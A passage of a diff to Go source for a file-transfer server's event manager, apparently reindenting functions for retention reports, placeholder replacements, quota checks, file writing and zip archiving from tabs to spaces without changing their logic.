dataprovider.GetBackupsPath(),\n-\t\t\t\tPermissions: map[string][]string{\n-\t\t\t\t\t\"/\": {dataprovider.PermAny},\n-\t\t\t\t},\n-\t\t\t},\n-\t\t}, nil\n-\t}\n-\tuser, err := dataprovider.UserExists(p.sender, \"\")\n-\tif err != nil {\n-\t\teventManagerLog(logger.LevelError, \"unable to get user %q: %+v\", p.sender, err)\n-\t\treturn user, fmt.Errorf(\"error getting user %q\", p.sender)\n-\t}\n-\treturn user, nil\n+        if p.sender == dataprovider.ActionExecutorSystem {\n+                return dataprovider.User{\n+                        BaseUser: sdk.BaseUser{\n+                                Status:   1,\n+                                Username: p.sender,\n+                                HomeDir:  dataprovider.GetBackupsPath(),\n+                                Permissions: map[string][]string{\n+                                        \"/\": {dataprovider.PermAny},\n+                                },\n+                        },\n+                }, nil\n+        }\n+        user, err := dataprovider.UserExists(p.sender, \"\")\n+        if err != nil {\n+                eventManagerLog(logger.LevelError, \"unable to get user %q: %+v\", p.sender, err)\n+                return user, fmt.Errorf(\"error getting user %q\", p.sender)\n+        }\n+        return user, nil\n }\n \n func (p *EventParams) getFolders() ([]vfs.BaseVirtualFolder, error) {\n-\tif p.sender == \"\" {\n-\t\tdump, err := dataprovider.DumpData([]string{dataprovider.DumpScopeFolders})\n-\t\treturn dump.Folders, err\n-\t}\n-\tfolder, err := dataprovider.GetFolderByName(p.sender)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error getting folder %q: %w\", p.sender, err)\n-\t}\n-\treturn []vfs.BaseVirtualFolder{folder}, nil\n+        if p.sender == \"\" {\n+                dump, err := dataprovider.DumpData([]string{dataprovider.DumpScopeFolders})\n+                return dump.Folders, err\n+        }\n+        folder, err := dataprovider.GetFolderByName(p.sender)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error getting folder %q: %w\", p.sender, err)\n+        }\n+        return []vfs.BaseVirtualFolder{folder}, nil\n }\n \n func (p *EventParams) getCompressedDataRetentionReport() ([]byte, error) {\n-\tif len(p.retentionChecks) == 0 {\n-\t\treturn nil, errors.New(\"no data retention report available\")\n-\t}\n-\tvar b bytes.Buffer\n-\tif _, err := p.writeCompressedDataRetentionReports(&b); err != nil {\n-\t\treturn nil, err\n-\t}\n-\treturn b.Bytes(), nil\n+        if len(p.retentionChecks) == 0 {\n+                return nil, errors.New(\"no data retention report available\")\n+        }\n+        var b bytes.Buffer\n+        if _, err := p.writeCompressedDataRetentionReports(&b); err != nil {\n+                return nil, err\n+        }\n+        return b.Bytes(), nil\n }\n \n func (p *EventParams) writeCompressedDataRetentionReports(w io.Writer) (int64, error) {\n-\tvar n int64\n-\twr := zip.NewWriter(w)\n-\n-\tfor _, check := range p.retentionChecks {\n-\t\tdata, err := getCSVRetentionReport(check.Results)\n-\t\tif err != nil {\n-\t\t\treturn n, fmt.Errorf(\"unable to get CSV report: %w\", err)\n-\t\t}\n-\t\tdataSize := int64(len(data))\n-\t\tn += dataSize\n-\t\t// we suppose a 3:1 compression ratio\n-\t\tif n > (maxAttachmentsSize * 3) {\n-\t\t\teventManagerLog(logger.LevelError, \"unable to get retention report, size too large: %s\",\n-\t\t\t\tutil.ByteCountIEC(n))\n-\t\t\treturn n, fmt.Errorf(\"unable to get retention report, size too large: %s\", util.ByteCountIEC(n))\n-\t\t}\n-\n-\t\tfh := &zip.FileHeader{\n-\t\t\tName:     fmt.Sprintf(\"%s-%s.csv\", check.ActionName, check.Username),\n-\t\t\tMethod:   zip.Deflate,\n-\t\t\tModified: time.Now().UTC(),\n-\t\t}\n-\t\tf, err := wr.CreateHeader(fh)\n-\t\tif err != nil {\n-\t\t\treturn n, fmt.Errorf(\"unable to create zip header for file %q: %w\", fh.Name, err)\n-\t\t}\n-\t\t_, err = io.CopyN(f, bytes.NewBuffer(data), dataSize)\n-\t\tif err != nil {\n-\t\t\treturn n, fmt.Errorf(\"unable to write content to zip file %q: %w\", fh.Name, err)\n-\t\t}\n-\t}\n-\tif err := wr.Close(); err != nil {\n-\t\treturn n, fmt.Errorf(\"unable to close zip writer: %w\", err)\n-\t}\n-\treturn n, nil\n+        var n int64\n+        wr := zip.NewWriter(w)\n+\n+        for _, check := range p.retentionChecks {\n+                data, err := getCSVRetentionReport(check.Results)\n+                if err != nil {\n+                        return n, fmt.Errorf(\"unable to get CSV report: %w\", err)\n+                }\n+                dataSize := int64(len(data))\n+                n += dataSize\n+                // we suppose a 3:1 compression ratio\n+                if n > (maxAttachmentsSize * 3) {\n+                        eventManagerLog(logger.LevelError, \"unable to get retention report, size too large: %s\",\n+                                util.ByteCountIEC(n))\n+                        return n, fmt.Errorf(\"unable to get retention report, size too large: %s\", util.ByteCountIEC(n))\n+                }\n+\n+                fh := &zip.FileHeader{\n+                        Name:     fmt.Sprintf(\"%s-%s.csv\", check.ActionName, check.Username),\n+                        Method:   zip.Deflate,\n+                        Modified: time.Now().UTC(),\n+                }\n+                f, err := wr.CreateHeader(fh)\n+                if err != nil {\n+                        return n, fmt.Errorf(\"unable to create zip header for file %q: %w\", fh.Name, err)\n+                }\n+                _, err = io.CopyN(f, bytes.NewBuffer(data), dataSize)\n+                if err != nil {\n+                        return n, fmt.Errorf(\"unable to write content to zip file %q: %w\", fh.Name, err)\n+                }\n+        }\n+        if err := wr.Close(); err != nil {\n+                return n, fmt.Errorf(\"unable to close zip writer: %w\", err)\n+        }\n+        return n, nil\n }\n \n func (p *EventParams) getRetentionReportsAsMailAttachment() (*mail.File, error) {\n-\tif len(p.retentionChecks) == 0 {\n-\t\treturn nil, errors.New(\"no data retention report available\")\n-\t}\n-\treturn &mail.File{\n-\t\tName:   \"retention-reports.zip\",\n-\t\tHeader: make(map[string][]string),\n-\t\tWriter: p.writeCompressedDataRetentionReports,\n-\t}, nil\n+        if len(p.retentionChecks) == 0 {\n+                return nil, errors.New(\"no data retention report available\")\n+        }\n+        return &mail.File{\n+                Name:   \"retention-reports.zip\",\n+                Header: make(map[string][]string),\n+                Writer: p.writeCompressedDataRetentionReports,\n+        }, nil\n }\n \n func (*EventParams) getStringReplacement(val string, jsonEscaped bool) string {\n-\tif jsonEscaped {\n-\t\treturn util.JSONEscape(val)\n-\t}\n-\treturn val\n+        if jsonEscaped {\n+                return util.JSONEscape(val)\n+        }\n+        return val\n }\n \n func (p *EventParams) getStringReplacements(addObjectData, jsonEscaped bool) []string {\n-\tvar dateTimeString string\n-\tif Config.TZ == \"local\" {\n-\t\tdateTimeString = p.Timestamp.Local().Format(dateTimeMillisFormat)\n-\t} else {\n-\t\tdateTimeString = p.Timestamp.UTC().Format(dateTimeMillisFormat)\n-\t}\n-\treplacements := []string{\n-\t\t\"{{Name}}\", p.getStringReplacement(p.Name, jsonEscaped),\n-\t\t\"{{Event}}\", p.Event,\n-\t\t\"{{Status}}\", fmt.Sprintf(\"%d\", p.Status),\n-\t\t\"{{VirtualPath}}\", p.getStringReplacement(p.VirtualPath, jsonEscaped),\n-\t\t\"{{EscapedVirtualPath}}\", p.getStringReplacement(url.QueryEscape(p.VirtualPath), jsonEscaped),\n-\t\t\"{{FsPath}}\", p.getStringReplacement(p.FsPath, jsonEscaped),\n-\t\t\"{{VirtualTargetPath}}\", p.getStringReplacement(p.VirtualTargetPath, jsonEscaped),\n-\t\t\"{{FsTargetPath}}\", p.getStringReplacement(p.FsTargetPath, jsonEscaped),\n-\t\t\"{{ObjectName}}\", p.getStringReplacement(p.ObjectName, jsonEscaped),\n-\t\t\"{{ObjectType}}\", p.ObjectType,\n-\t\t\"{{FileSize}}\", strconv.FormatInt(p.FileSize, 10),\n-\t\t\"{{Elapsed}}\", strconv.FormatInt(p.Elapsed, 10),\n-\t\t\"{{Protocol}}\", p.Protocol,\n-\t\t\"{{IP}}\", p.IP,\n-\t\t\"{{Role}}\", p.getStringReplacement(p.Role, jsonEscaped),\n-\t\t\"{{Email}}\", p.getStringReplacement(p.Email, jsonEscaped),\n-\t\t\"{{Timestamp}}\", strconv.FormatInt(p.Timestamp.UnixNano(), 10),\n-\t\t\"{{DateTime}}\", dateTimeString,\n-\t\t\"{{StatusString}}\", p.getStatusString(),\n-\t\t\"{{UID}}\", p.getStringReplacement(p.UID, jsonEscaped),\n-\t\t\"{{Ext}}\", p.getStringReplacement(p.Extension, jsonEscaped),\n-\t}\n-\tif p.VirtualPath != \"\" {\n-\t\treplacements = append(replacements, \"{{VirtualDirPath}}\", p.getStringReplacement(path.Dir(p.VirtualPath), jsonEscaped))\n-\t}\n-\tif p.VirtualTargetPath != \"\" {\n-\t\treplacements = append(replacements, \"{{VirtualTargetDirPath}}\", p.getStringReplacement(path.Dir(p.VirtualTargetPath), jsonEscaped))\n-\t\treplacements = append(replacements, \"{{TargetName}}\", p.getStringReplacement(path.Base(p.VirtualTargetPath), jsonEscaped))\n-\t}\n-\tif len(p.errors) > 0 {\n-\t\treplacements = append(replacements, \"{{ErrorString}}\", p.getStringReplacement(strings.Join(p.errors, \", \"), jsonEscaped))\n-\t} else {\n-\t\treplacements = append(replacements, \"{{ErrorString}}\", \"\")\n-\t}\n-\treplacements = append(replacements, objDataPlaceholder, \"{}\")\n-\treplacements = append(replacements, objDataPlaceholderString, \"\")\n-\tif addObjectData {\n-\t\tdata, err := p.Object.RenderAsJSON(p.Event != operationDelete)\n-\t\tif err == nil {\n-\t\t\tdataString := util.BytesToString(data)\n-\t\t\treplacements[len(replacements)-3] = p.getStringReplacement(dataString, false)\n-\t\t\treplacements[len(replacements)-1] = p.getStringReplacement(dataString, true)\n-\t\t}\n-\t}\n-\tif p.IDPCustomFields != nil {\n-\t\tfor k, v := range *p.IDPCustomFields {\n-\t\t\treplacements = append(replacements, fmt.Sprintf(\"{{IDPField%s}}\", k), p.getStringReplacement(v, jsonEscaped))\n-\t\t}\n-\t}\n-\treplacements = append(replacements, \"{{Metadata}}\", \"{}\")\n-\treplacements = append(replacements, \"{{MetadataString}}\", \"\")\n-\tif len(p.Metadata) > 0 {\n-\t\tdata, err := json.Marshal(p.Metadata)\n-\t\tif err == nil {\n-\t\t\tdataString := util.BytesToString(data)\n-\t\t\treplacements[len(replacements)-3] = p.getStringReplacement(dataString, false)\n-\t\t\treplacements[len(replacements)-1] = p.getStringReplacement(dataString, true)\n-\t\t}\n-\t}\n-\treturn replacements\n+        var dateTimeString string\n+        if Config.TZ == \"local\" {\n+                dateTimeString = p.Timestamp.Local().Format(dateTimeMillisFormat)\n+        } else {\n+                dateTimeString = p.Timestamp.UTC().Format(dateTimeMillisFormat)\n+        }\n+        replacements := []string{\n+                \"{{Name}}\", p.getStringReplacement(p.Name, jsonEscaped),\n+                \"{{Event}}\", p.Event,\n+                \"{{Status}}\", fmt.Sprintf(\"%d\", p.Status),\n+                \"{{VirtualPath}}\", p.getStringReplacement(p.VirtualPath, jsonEscaped),\n+                \"{{EscapedVirtualPath}}\", p.getStringReplacement(url.QueryEscape(p.VirtualPath), jsonEscaped),\n+                \"{{FsPath}}\", p.getStringReplacement(p.FsPath, jsonEscaped),\n+                \"{{VirtualTargetPath}}\", p.getStringReplacement(p.VirtualTargetPath, jsonEscaped),\n+                \"{{FsTargetPath}}\", p.getStringReplacement(p.FsTargetPath, jsonEscaped),\n+                \"{{ObjectName}}\", p.getStringReplacement(p.ObjectName, jsonEscaped),\n+                \"{{ObjectType}}\", p.ObjectType,\n+                \"{{FileSize}}\", strconv.FormatInt(p.FileSize, 10),\n+                \"{{Elapsed}}\", strconv.FormatInt(p.Elapsed, 10),\n+                \"{{Protocol}}\", p.Protocol,\n+                \"{{IP}}\", p.IP,\n+                \"{{Role}}\", p.getStringReplacement(p.Role, jsonEscaped),\n+                \"{{Email}}\", p.getStringReplacement(p.Email, jsonEscaped),\n+                \"{{Timestamp}}\", strconv.FormatInt(p.Timestamp.UnixNano(), 10),\n+                \"{{DateTime}}\", dateTimeString,\n+                \"{{StatusString}}\", p.getStatusString(),\n+                \"{{UID}}\", p.getStringReplacement(p.UID, jsonEscaped),\n+                \"{{Ext}}\", p.getStringReplacement(p.Extension, jsonEscaped),\n+        }\n+        if p.VirtualPath != \"\" {\n+                replacements = append(replacements, \"{{VirtualDirPath}}\", p.getStringReplacement(path.Dir(p.VirtualPath), jsonEscaped))\n+        }\n+        if p.VirtualTargetPath != \"\" {\n+                replacements = append(replacements, \"{{VirtualTargetDirPath}}\", p.getStringReplacement(path.Dir(p.VirtualTargetPath), jsonEscaped))\n+                replacements = append(replacements, \"{{TargetName}}\", p.getStringReplacement(path.Base(p.VirtualTargetPath), jsonEscaped))\n+        }\n+        if len(p.errors) > 0 {\n+                replacements = append(replacements, \"{{ErrorString}}\", p.getStringReplacement(strings.Join(p.errors, \", \"), jsonEscaped))\n+        } else {\n+                replacements = append(replacements, \"{{ErrorString}}\", \"\")\n+        }\n+        replacements = append(replacements, objDataPlaceholder, \"{}\")\n+        replacements = append(replacements, objDataPlaceholderString, \"\")\n+        if addObjectData {\n+                data, err := p.Object.RenderAsJSON(p.Event != operationDelete)\n+                if err == nil {\n+                        dataString := util.BytesToString(data)\n+                        replacements[len(replacements)-3] = p.getStringReplacement(dataString, false)\n+                        replacements[len(replacements)-1] = p.getStringReplacement(dataString, true)\n+                }\n+        }\n+        if p.IDPCustomFields != nil {\n+                for k, v := range *p.IDPCustomFields {\n+                        replacements = append(replacements, fmt.Sprintf(\"{{IDPField%s}}\", k), p.getStringReplacement(v, jsonEscaped))\n+                }\n+        }\n+        replacements = append(replacements, \"{{Metadata}}\", \"{}\")\n+        replacements = append(replacements, \"{{MetadataString}}\", \"\")\n+        if len(p.Metadata) > 0 {\n+                data, err := json.Marshal(p.Metadata)\n+                if err == nil {\n+                        dataString := util.BytesToString(data)\n+                        replacements[len(replacements)-3] = p.getStringReplacement(dataString, false)\n+                        replacements[len(replacements)-1] = p.getStringReplacement(dataString, true)\n+                }\n+        }\n+        return replacements\n }\n \n func getCSVRetentionReport(results []folderRetentionCheckResult) ([]byte, error) {\n-\tvar b bytes.Buffer\n-\tcsvWriter := csv.NewWriter(&b)\n-\terr := csvWriter.Write([]string{\"path\", \"retention (hours)\", \"deleted files\", \"deleted size (bytes)\",\n-\t\t\"elapsed (ms)\", \"info\", \"error\"})\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tfor _, result := range results {\n-\t\terr = csvWriter.Write([]string{result.Path, strconv.Itoa(result.Retention), strconv.Itoa(result.DeletedFiles),\n-\t\t\tstrconv.FormatInt(result.DeletedSize, 10), strconv.FormatInt(result.Elapsed.Milliseconds(), 10),\n-\t\t\tresult.Info, result.Error})\n-\t\tif err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\t}\n-\n-\tcsvWriter.Flush()\n-\terr = csvWriter.Error()\n-\treturn b.Bytes(), err\n+        var b bytes.Buffer\n+        csvWriter := csv.NewWriter(&b)\n+        err := csvWriter.Write([]string{\"path\", \"retention (hours)\", \"deleted files\", \"deleted size (bytes)\",\n+                \"elapsed (ms)\", \"info\", \"error\"})\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        for _, result := range results {\n+                err = csvWriter.Write([]string{result.Path, strconv.Itoa(result.Retention), strconv.Itoa(result.DeletedFiles),\n+                        strconv.FormatInt(result.DeletedSize, 10), strconv.FormatInt(result.Elapsed.Milliseconds(), 10),\n+                        result.Info, result.Error})\n+                if err != nil {\n+                        return nil, err\n+                }\n+        }\n+\n+        csvWriter.Flush()\n+        err = csvWriter.Error()\n+        return b.Bytes(), err\n }\n \n func closeWriterAndUpdateQuota(w io.WriteCloser, conn *BaseConnection, virtualSourcePath, virtualTargetPath string,\n-\tnumFiles int, truncatedSize int64, errTransfer error, operation string, startTime time.Time,\n+        numFiles int, truncatedSize int64, errTransfer error, operation string, startTime time.Time,\n ) error {\n-\tvar fsDstPath string\n-\tvar errDstFs error\n-\terrWrite := w.Close()\n-\ttargetPath := virtualSourcePath\n-\tif virtualTargetPath != \"\" {\n-\t\ttargetPath = virtualTargetPath\n-\t\tvar fsDst vfs.Fs\n-\t\tfsDst, fsDstPath, errDstFs = conn.GetFsAndResolvedPath(virtualTargetPath)\n-\t\tif errTransfer != nil && errDstFs == nil {\n-\t\t\t// try to remove a partial file on error. If this fails, we can't do anything\n-\t\t\terrRemove := fsDst.Remove(fsDstPath, false)\n-\t\t\tconn.Log(logger.LevelDebug, \"removing partial file %q after write error, result: %v\", virtualTargetPath, errRemove)\n-\t\t}\n-\t}\n-\tinfo, err := conn.doStatInternal(targetPath, 0, false, false)\n-\tif err == nil {\n-\t\tupdateUserQuotaAfterFileWrite(conn, targetPath, numFiles, info.Size()-truncatedSize)\n-\t\tvar fsSrcPath string\n-\t\tvar errSrcFs error\n-\t\tif virtualSourcePath != \"\" {\n-\t\t\t_, fsSrcPath, errSrcFs = conn.GetFsAndResolvedPath(virtualSourcePath)\n-\t\t}\n-\t\tif errSrcFs == nil && errDstFs == nil {\n-\t\t\telapsed := time.Since(startTime).Nanoseconds() / 1000000\n-\t\t\tif errTransfer == nil {\n-\t\t\t\terrTransfer = errWrite\n-\t\t\t}\n-\t\t\tif operation == operationCopy {\n-\t\t\t\tlogger.CommandLog(copyLogSender, fsSrcPath, fsDstPath, conn.User.Username, \"\", conn.ID, conn.protocol, -1, -1,\n-\t\t\t\t\t\"\", \"\", \"\", info.Size(), conn.localAddr, conn.remoteAddr, elapsed)\n-\t\t\t}\n-\t\t\tExecuteActionNotification(conn, operation, fsSrcPath, virtualSourcePath, fsDstPath, virtualTargetPath, \"\", info.Size(), errTransfer, elapsed, nil) //nolint:errcheck\n-\t\t}\n-\t} else {\n-\t\teventManagerLog(logger.LevelWarn, \"unable to update quota after writing %q: %v\", targetPath, err)\n-\t}\n-\tif errTransfer != nil {\n-\t\treturn errTransfer\n-\t}\n-\treturn errWrite\n+        var fsDstPath string\n+        var errDstFs error\n+        errWrite := w.Close()\n+        targetPath := virtualSourcePath\n+        if virtualTargetPath != \"\" {\n+                targetPath = virtualTargetPath\n+                var fsDst vfs.Fs\n+                fsDst, fsDstPath, errDstFs = conn.GetFsAndResolvedPath(virtualTargetPath)\n+                if errTransfer != nil && errDstFs == nil {\n+                        // try to remove a partial file on error. If this fails, we can't do anything\n+                        errRemove := fsDst.Remove(fsDstPath, false)\n+                        conn.Log(logger.LevelDebug, \"removing partial file %q after write error, result: %v\", virtualTargetPath, errRemove)\n+                }\n+        }\n+        info, err := conn.doStatInternal(targetPath, 0, false, false)\n+        if err == nil {\n+                updateUserQuotaAfterFileWrite(conn, targetPath, numFiles, info.Size()-truncatedSize)\n+                var fsSrcPath string\n+                var errSrcFs error\n+                if virtualSourcePath != \"\" {\n+                        _, fsSrcPath, errSrcFs = conn.GetFsAndResolvedPath(virtualSourcePath)\n+                }\n+                if errSrcFs == nil && errDstFs == nil {\n+                        elapsed := time.Since(startTime).Nanoseconds() / 1000000\n+                        if errTransfer == nil {\n+                                errTransfer = errWrite\n+                        }\n+                        if operation == operationCopy {\n+                                logger.CommandLog(copyLogSender, fsSrcPath, fsDstPath, conn.User.Username, \"\", conn.ID, conn.protocol, -1, -1,\n+                                        \"\", \"\", \"\", info.Size(), conn.localAddr, conn.remoteAddr, elapsed)\n+                        }\n+                        ExecuteActionNotification(conn, operation, fsSrcPath, virtualSourcePath, fsDstPath, virtualTargetPath, \"\", info.Size(), errTransfer, elapsed, nil) //nolint:errcheck\n+                }\n+        } else {\n+                eventManagerLog(logger.LevelWarn, \"unable to update quota after writing %q: %v\", targetPath, err)\n+        }\n+        if errTransfer != nil {\n+                return errTransfer\n+        }\n+        return errWrite\n }\n \n func updateUserQuotaAfterFileWrite(conn *BaseConnection, virtualPath string, numFiles int, fileSize int64) {\n-\tvfolder, err := conn.User.GetVirtualFolderForPath(path.Dir(virtualPath))\n-\tif err != nil {\n-\t\tdataprovider.UpdateUserQuota(&conn.User, numFiles, fileSize, false) //nolint:errcheck\n-\t\treturn\n-\t}\n-\tdataprovider.UpdateUserFolderQuota(&vfolder, &conn.User, numFiles, fileSize, false)\n+        vfolder, err := conn.User.GetVirtualFolderForPath(path.Dir(virtualPath))\n+        if err != nil {\n+                dataprovider.UpdateUserQuota(&conn.User, numFiles, fileSize, false) //nolint:errcheck\n+                return\n+        }\n+        dataprovider.UpdateUserFolderQuota(&vfolder, &conn.User, numFiles, fileSize, false)\n }\n \n func checkWriterPermsAndQuota(conn *BaseConnection, virtualPath string, numFiles int, expectedSize, truncatedSize int64) error {\n-\tif numFiles == 0 {\n-\t\tif !conn.User.HasPerm(dataprovider.PermOverwrite, path.Dir(virtualPath)) {\n-\t\t\treturn conn.GetPermissionDeniedError()\n-\t\t}\n-\t} else {\n-\t\tif !conn.User.HasPerm(dataprovider.PermUpload, path.Dir(virtualPath)) {\n-\t\t\treturn conn.GetPermissionDeniedError()\n-\t\t}\n-\t}\n-\tq, _ := conn.HasSpace(numFiles > 0, false, virtualPath)\n-\tif !q.HasSpace {\n-\t\treturn conn.GetQuotaExceededError()\n-\t}\n-\tif expectedSize != -1 {\n-\t\tsizeDiff := expectedSize - truncatedSize\n-\t\tif sizeDiff > 0 {\n-\t\t\tremainingSize := q.GetRemainingSize()\n-\t\t\tif remainingSize > 0 && remainingSize < sizeDiff {\n-\t\t\t\treturn conn.GetQuotaExceededError()\n-\t\t\t}\n-\t\t}\n-\t}\n-\treturn nil\n+        if numFiles == 0 {\n+                if !conn.User.HasPerm(dataprovider.PermOverwrite, path.Dir(virtualPath)) {\n+                        return conn.GetPermissionDeniedError()\n+                }\n+        } else {\n+                if !conn.User.HasPerm(dataprovider.PermUpload, path.Dir(virtualPath)) {\n+                        return conn.GetPermissionDeniedError()\n+                }\n+        }\n+        q, _ := conn.HasSpace(numFiles > 0, false, virtualPath)\n+        if !q.HasSpace {\n+                return conn.GetQuotaExceededError()\n+        }\n+        if expectedSize != -1 {\n+                sizeDiff := expectedSize - truncatedSize\n+                if sizeDiff > 0 {\n+                        remainingSize := q.GetRemainingSize()\n+                        if remainingSize > 0 && remainingSize < sizeDiff {\n+                                return conn.GetQuotaExceededError()\n+                        }\n+                }\n+        }\n+        return nil\n }\n \n func getFileWriter(conn *BaseConnection, virtualPath string, expectedSize int64) (io.WriteCloser, int, int64, func(), error) {\n-\tfs, fsPath, err := conn.GetFsAndResolvedPath(virtualPath)\n-\tif err != nil {\n-\t\treturn nil, 0, 0, nil, err\n-\t}\n-\tvar truncatedSize, fileSize int64\n-\tnumFiles := 1\n-\tisFileOverwrite := false\n-\n-\tinfo, err := fs.Lstat(fsPath)\n-\tif err == nil {\n-\t\tfileSize = info.Size()\n-\t\tif info.IsDir() {\n-\t\t\treturn nil, numFiles, truncatedSize, nil, fmt.Errorf(\"cannot write to a directory: %q\", virtualPath)\n-\t\t}\n-\t\tif info.Mode().IsRegular() {\n-\t\t\tisFileOverwrite = true\n-\t\t\ttruncatedSize = fileSize\n-\t\t}\n-\t\tnumFiles = 0\n-\t}\n-\tif err != nil && !fs.IsNotExist(err) {\n-\t\treturn nil, numFiles, truncatedSize, nil, conn.GetFsError(fs, err)\n-\t}\n-\tif err := checkWriterPermsAndQuota(conn, virtualPath, numFiles, expectedSize, truncatedSize); err != nil {\n-\t\treturn nil, numFiles, truncatedSize, nil, err\n-\t}\n-\tf, w, cancelFn, err := fs.Create(fsPath, 0, conn.GetCreateChecks(virtualPath, numFiles == 1, false))\n-\tif err != nil {\n-\t\treturn nil, numFiles, truncatedSize, nil, conn.GetFsError(fs, err)\n-\t}\n-\tvfs.SetPathPermissions(fs, fsPath, conn.User.GetUID(), conn.User.GetGID())\n-\n-\tif isFileOverwrite {\n-\t\tif vfs.HasTruncateSupport(fs) || vfs.IsCryptOsFs(fs) {\n-\t\t\tupdateUserQuotaAfterFileWrite(conn, virtualPath, numFiles, -fileSize)\n-\t\t\ttruncatedSize = 0\n-\t\t}\n-\t}\n-\tif cancelFn == nil {\n-\t\tcancelFn = func() {}\n-\t}\n-\tif f != nil {\n-\t\treturn f, numFiles, truncatedSize, cancelFn, nil\n-\t}\n-\treturn w, numFiles, truncatedSize, cancelFn, nil\n+        fs, fsPath, err := conn.GetFsAndResolvedPath(virtualPath)\n+        if err != nil {\n+                return nil, 0, 0, nil, err\n+        }\n+        var truncatedSize, fileSize int64\n+        numFiles := 1\n+        isFileOverwrite := false\n+\n+        info, err := fs.Lstat(fsPath)\n+        if err == nil {\n+                fileSize = info.Size()\n+                if info.IsDir() {\n+                        return nil, numFiles, truncatedSize, nil, fmt.Errorf(\"cannot write to a directory: %q\", virtualPath)\n+                }\n+                if info.Mode().IsRegular() {\n+                        isFileOverwrite = true\n+                        truncatedSize = fileSize\n+                }\n+                numFiles = 0\n+        }\n+        if err != nil && !fs.IsNotExist(err) {\n+                return nil, numFiles, truncatedSize, nil, conn.GetFsError(fs, err)\n+        }\n+        if err := checkWriterPermsAndQuota(conn, virtualPath, numFiles, expectedSize, truncatedSize); err != nil {\n+                return nil, numFiles, truncatedSize, nil, err\n+        }\n+        f, w, cancelFn, err := fs.Create(fsPath, 0, conn.GetCreateChecks(virtualPath, numFiles == 1, false))\n+        if err != nil {\n+                return nil, numFiles, truncatedSize, nil, conn.GetFsError(fs, err)\n+        }\n+        vfs.SetPathPermissions(fs, fsPath, conn.User.GetUID(), conn.User.GetGID())\n+\n+        if isFileOverwrite {\n+                if vfs.HasTruncateSupport(fs) || vfs.IsCryptOsFs(fs) {\n+                        updateUserQuotaAfterFileWrite(conn, virtualPath, numFiles, -fileSize)\n+                        truncatedSize = 0\n+                }\n+        }\n+        if cancelFn == nil {\n+                cancelFn = func() {}\n+        }\n+        if f != nil {\n+                return f, numFiles, truncatedSize, cancelFn, nil\n+        }\n+        return w, numFiles, truncatedSize, cancelFn, nil\n }\n \n func addZipEntry(wr *zipWriterWrapper, conn *BaseConnection, entryPath, baseDir string, recursion int) error {\n-\tif entryPath == wr.Name {\n-\t\t// skip the archive itself\n-\t\treturn nil\n-\t}\n-\tif recursion >= util.MaxRecursion {\n-\t\teventManagerLog(logger.LevelError, \"unable to add zip entry %q, recursion too deep: %v\", entryPath, recursion)\n-\t\treturn util.ErrRecursionTooDeep\n-\t}\n-\trecursion++\n-\tinfo, err := conn.DoStat(entryPath, 1, false)\n-\tif err != nil {\n-\t\teventManagerLog(logger.LevelError, \"unable to add zip entry %q, stat error: %v\", entryPath, err)\n-\t\treturn err\n-\t}\n-\tentryName, err := getZipEntryName(entryPath, baseDir)\n-\tif err != nil {\n-\t\teventManagerLog(logger.LevelError, \"unable to get zip entry name: %v\", err)\n-\t\treturn err\n-\t}\n-\tif _, ok := wr.Entries[entryName]; ok {\n-\t\teventManagerLog(logger.LevelInfo, \"skipping duplicate zip entry %q, is dir %t\", entryPath, info.IsDir())\n-\t\treturn nil\n-\t}\n-\twr.Entries[entryName] = true\n-\tif info.IsDir() {\n-\t\t_, err = wr.Writer.CreateHeader(&zip.FileHeader{\n-\t\t\tName:     entryName + \"/\",\n-\t\t\tMethod:   zip.Deflate,\n-\t\t\tModified: info.ModTime(),\n-\t\t})\n-\t\tif err != nil {\n-\t\t\teventManagerLog(logger.LevelError, \"unable to create zip entry %q: %v\", entryPath, err)\n-\t\t\treturn fmt.Errorf(\"unable to create zip entry %q: %w\", entryPath, err)\n-\t\t}\n-\t\tlister, err := conn.ListDir(entryPath)\n-\t\tif err != nil {\n-\t\t\teventManagerLog(logger.LevelError, \"unable to add zip entry %q, get dir lister error: %v\", entryPath, err)\n-\t\t\treturn fmt.Errorf(\"unable to add zip entry %q: %w\", entryPath, err)\n-\t\t}\n-\t\tdefer lister.Close()\n-\n-\t\tfor {\n-\t\t\tcontents, err := lister.Next(vfs.ListerBatchSize)\n-\t\t\tfinished := errors.Is(err, io.EOF)\n-\t\t\tif err := lister.convertError(err); err != nil {\n-\t\t\t\teventManagerLog(logger.LevelError, \"unable to add zip entry %q, read dir error: %v\", entryPath, err)\n-\t\t\t\treturn fmt.Errorf(\"unable to add zip entry %q: %w\", entryPath, err)\n-\t\t\t}\n-\t\t\tfor _, info := range contents {\n-\t\t\t\tfullPath := util.CleanPath(path.Join(entryPath, info.Name()))\n-\t\t\t\tif err := addZipEntry(wr, conn, fullPath, baseDir, recursion); err != nil {\n-\t\t\t\t\teventManagerLog(logger.LevelError, \"unable to add zip entry: %v\", err)\n-\t\t\t\t\treturn err\n-\t\t\t\t}\n-\t\t\t}\n-\t\t\tif finished {\n-\t\t\t\treturn nil\n-\t\t\t}\n-\t\t}\n-\t}\n-\tif !info.Mode().IsRegular() {\n-\t\t// we only allow regular files\n-\t\teventManagerLog(logger.LevelInfo, \"skipping zip entry for non regular file %q\", entryPath)\n-\t\treturn nil\n-\t}\n-\n-\treturn addFileToZip(wr, conn, entryPath, entryName, info.ModTime())\n+        if entryPath == wr.Name {\n+                // skip the archive itself\n+                return nil\n+        }\n+        if recursion >= util.MaxRecursion {\n+                eventManagerLog(logger.LevelError, \"unable to add zip entry %q, recursion too deep: %v\", entryPath, recursion)\n+                return util.ErrRecursionTooDeep\n+        }\n+        recursion++\n+        info, err := conn.DoStat(entryPath, 1, false)\n+        if err != nil {\n+                eventManagerLog(logger.LevelError, \"unable to add zip entry %q, stat error: %v\", entryPath, err)\n+                return err\n+        }\n+        entryName, err := getZipEntryName(entryPath, baseDir)\n+        if err != nil {\n+                eventManagerLog(logger.LevelError, \"unable to get zip entry name: %v\", err)\n+                return err\n+        }\n+        if _, ok := wr.Entries[entryName]; ok {\n+                eventManagerLog(logger.LevelInfo, \"skipping duplicate zip entry %q, is dir %t\", entryPath, info.IsDir())\n+                return nil\n+        }\n+        wr.Entries[entryName] = true\n+        if info.IsDir() {\n+                _, err = wr.Writer.CreateHeader(&zip.FileHeader{\n+                        Name:     entryName + \"/\",\n+                        Method:   zip.Deflate,\n+                        Modified: 